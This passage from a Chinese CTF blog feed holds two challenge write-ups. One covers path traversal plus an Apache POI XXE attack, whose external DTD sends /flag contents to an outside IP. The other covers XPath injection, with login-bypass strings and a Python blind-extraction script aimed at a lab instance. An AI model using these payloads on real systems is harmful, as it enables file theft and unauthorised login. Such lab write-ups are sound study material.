class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/DownloadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>ListFileServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>cn.abc.servlet.ListFileServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>ListFileServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/ListFileServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>UploadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>cn.abc.servlet.UploadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>UploadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/UploadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而这些文件都在WEB-INF/classes下</p><p>注意这是java，<code>cn.abc.servlet.DownloadServlet</code>这种形式是包名，所以路径为：</p><pre class="line-numbers language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class..&#x2F;..&#x2F;..&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class..&#x2F;..&#x2F;..&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以用Jd-gui-windows反编译，也可以直接用idea。</p><p>对excel进行处理。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/image-20210827200237022.png"></p><p>然后就是百度下java的excel相关漏洞，有很多</p><p>具体可见<a href="https://www.jianshu.com/p/73cd11d83c30">Apache POI XML外部实体（XML External Entity，XXE）攻击详解</a></p><p>加个</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;172.16.173.129&#x2F;penson.dtd&quot;&gt;%remote;%int;%send;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>放到这个文件里</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/image-20210827203319860.png"></p><p>excel文件名字需要改成excel-xxx</p><p>因为是内网环境，在buu上开个linux靶机，然后创建个penson.dtd文件，放进去</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;172.16.173.129:2333?p&#x3D;%file;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后上传，</p><p>得，又打不通，试了半天都不行。</p><p>真无语了，一涉及内网，就打不通，这都第三回了。真的烦。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[NPUCTF2020]ezlogin</title>
      <link href="/p/720437907.html"/>
      <url>/p/720437907.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[登录框动画]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826203523313.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>看了下，登录验证在static/main.js里</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var current &#x3D; null;document.querySelector(&#39;#username&#39;).addEventListener(&#39;focus&#39;, function(e) &#123;  if (current) current.pause();  current &#x3D; anime(&#123;    targets: &#39;path&#39;,    strokeDashoffset: &#123;      value: 0,      duration: 700,      easing: &#39;easeOutQuart&#39;    &#125;,    strokeDasharray: &#123;      value: &#39;240 1386&#39;,      duration: 700,      easing: &#39;easeOutQuart&#39;    &#125;  &#125;);&#125;);document.querySelector(&#39;#password&#39;).addEventListener(&#39;focus&#39;, function(e) &#123;  if (current) current.pause();  current &#x3D; anime(&#123;    targets: &#39;path&#39;,    strokeDashoffset: &#123;      value: -336,      duration: 700,      easing: &#39;easeOutQuart&#39;    &#125;,    strokeDasharray: &#123;      value: &#39;240 1386&#39;,      duration: 700,      easing: &#39;easeOutQuart&#39;    &#125;  &#125;);&#125;);document.querySelector(&#39;#submit&#39;).addEventListener(&#39;focus&#39;, function(e) &#123;  if (current) current.pause();  current &#x3D; anime(&#123;    targets: &#39;path&#39;,    strokeDashoffset: &#123;      value: -730,      duration: 700,      easing: &#39;easeOutQuart&#39;    &#125;,    strokeDasharray: &#123;      value: &#39;530 1386&#39;,      duration: 700,      easing: &#39;easeOutQuart&#39;    &#125;  &#125;);&#125;);function doLogin()&#123;  var username &#x3D; $(&quot;#username&quot;).val();  var password &#x3D; $(&quot;#password&quot;).val();  var token &#x3D; $(&quot;#token&quot;).val();  if(username &#x3D;&#x3D; &quot;&quot; || password &#x3D;&#x3D; &quot;&quot;)&#123;    $(&quot;.msg&quot;).text(&quot;用户名和密码不能为空!&quot;);    return;  &#125;  var data &#x3D; &quot;&lt;username&gt;&quot;+username+&quot;&lt;&#x2F;username&gt;&quot;+&quot;&lt;password&gt;&quot;+password+&quot;&lt;&#x2F;password&gt;&quot;+&quot;&lt;token&gt;&quot;+token+&quot;&lt;&#x2F;token&gt;&quot;;    $.ajax(&#123;        type: &quot;POST&quot;,        url: &quot;login.php&quot;,        contentType: &quot;application&#x2F;xml&quot;,        data: data,        anysc: false,        success: function (result, status, xhr) &#123;          if(result &#x3D;&#x3D; &#39;成功&#39;)&#123;            window.location.href &#x3D; &#39;admin.php&#39;;          &#125;          $(&quot;.msg&quot;).text(result);        &#125;,        error: function (XMLHttpRequest,textStatus,errorThrown) &#123;            $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus);        &#125;    &#125;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这动画还蛮炫的</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826203824528.png"></p><p>是以这样的形式传过去的：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826204841573.png"></p><p>加个<code>&lt;?xml version=&quot;1.0&quot;?&gt;</code>提示格式错误</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826205028810.png"></p><p>还以为是XXE试了半天不行，一看wp，得，xpath注入。</p><p>虽然爬虫用过xpath，但没想到还能注入。</p><h3 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h3><blockquote><p>XPath没有注释一说，所以构造的payload要根据语句进行闭合</p></blockquote><p><a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">XPath 注入指北</a></p><ul><li><p>字符串相关函数</p><p>codepoints-to-string(a, b, c, …)：将数字 a、b、c 转为对应的字符， Python 的<code>chr</code>函数类似。</p><p>string-to-codepoints(string)：与上面的相反</p><p>compare(a, b, rule)：比大小，func 是比较大小的规则</p><p>string-join((string, string, …), sep)：使用 sep 参数作为分隔符，来返回 string 参数拼接后的字符串。</p><p>substring(string, start [,len])：返回从 start 位置开始的指定长度的子字符串。第一个字符的下标是 1。如果省略 len 参数，则返回从位置 start 到字符串末尾的子字符串。</p><p>string-length([string])：返回指定字符串的长度。如果没有 string 参数，则返回当前节点的字符串值的长度。</p></li><li><p>其他函数</p><p>count(item[, item1, …])：返回节点的数量。</p><p>position()：返回当前正在被处理的节点的 index 位置。</p><p>last()：返回在被处理的节点列表中的项目数目。</p><p>name([nodeset])：返回当前节点的名称或指定节点集中的第一个节点。</p></li></ul><p>举个例子</p><p>users.xml：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>md5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>0192023a7bbd73250516f069df18b500<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>jack<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>md5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1d6c1e168e362bc0092f247399003a88<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>tony<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>md5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>cc20f43c8c24dbc0b2539489b113277a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>secret</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>flag</span><span class="token punctuation">></span></span>flag&#123;My_f1rst_xp4th_iNjecti0n&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>flag</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>secret</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index.php：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users.xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/root/users/user[username/text()='"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string double-quoted-string">"' and password/text()='"</span><span class="token operator">.</span><span class="token variable">$pwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"']"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$xml</span><span class="token operator">-></span><span class="token function">xpath</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;h2>Welcome&lt;/h2>'</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />ID:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />Username:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h5><p>这段测试代码的查询语句如下：</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery"><span class="token punctuation">/</span>root<span class="token punctuation">/</span>users<span class="token punctuation">/</span>user<span class="token punctuation">[</span>username<span class="token punctuation">/</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">''</span> <span class="token keyword-operator operator">and</span> password<span class="token punctuation">/</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>万能密码：</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery">u <span class="token operator">=</span> <span class="token string">"admin' or '1"</span>p <span class="token operator">=</span> <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>结果：</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery"><span class="token punctuation">/</span>root<span class="token punctuation">/</span>users<span class="token punctuation">/</span>user<span class="token punctuation">[</span>username<span class="token punctuation">/</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'admin'</span> <span class="token keyword-operator operator">or</span> <span class="token string">'1'</span> <span class="token keyword-operator operator">and</span> password<span class="token punctuation">/</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'d41d8cd98f00b204e9800998ecf8427e'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若不知道用户名则可以再加个or</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery">u <span class="token operator">=</span> <span class="token string">"' or 1 or '1"</span>p <span class="token operator">=</span> <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery"><span class="token punctuation">/</span>root<span class="token punctuation">/</span>users<span class="token punctuation">/</span>user<span class="token punctuation">[</span>username<span class="token punctuation">/</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">''</span> <span class="token keyword-operator operator">or</span> <span class="token number">1</span> <span class="token keyword-operator operator">or</span> <span class="token string">'1'</span> <span class="token keyword-operator operator">and</span> password<span class="token punctuation">/</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'d41d8cd98f00b204e9800998ecf8427e'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是根据XML特性来的</p><blockquote><p>查询如果不是用[键=’值’]这种方式的查询，只会返回所有路径标签的值<br>如果带有[键=’值’]的查询，会返回和该路径相同的所有路径和该类路径之下节点的所有的值</p></blockquote><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>1.判断根节点数量</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery">u <span class="token operator">=</span> <span class="token string">"' or count(/)=1 or '1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>count(/)=1</code> 一直到 <code>count(/)=n</code>，判断出根节点有几个。</p><p>若<code>u = &quot;&#39; or count(/)=1 or &#39;1&quot;</code>返回正常，说明只有 1 个根节点。下文同理。</p><p>2.获取根节点名</p><p>首先获取名字长度</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery">u <span class="token operator">=</span> <span class="token string">"' or string-length(name(/*[1]))=1 or '1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来获取逐个字符获取名字</p><pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery">u <span class="token operator">=</span> <span class="token string">"' or substring(name(/*[1]), 1, 1)='a' or '1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>回到题目，先猜根节点，脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> times <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://9dd95219-88d2-4ba7-b7b8-7ef112820c15.node4.buuoj.cn:81/'</span>head <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/xml"</span><span class="token punctuation">&#125;</span>find <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;input type="hidden" id="token" value="(.*?)" />'</span><span class="token punctuation">)</span>strs <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> strs<span class="token punctuation">:</span>        r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> find<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token comment"># 猜测根节点名称</span>        payload_1 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># 猜测子节点名称</span>        payload_2 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/root/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># 猜测accounts的节点</span>        payload_3 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># 猜测user节点</span>        payload_4 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># 跑用户名和密码</span>        payload_username <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        payload_password <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">,</span> data<span class="token operator">=</span>payload_1<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"非法操作"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token string">"用户名或密码错误!"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意，xpath是从[1]开始的</p></blockquote><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826214759893.png"></p><p>root的子节点</p><p><img 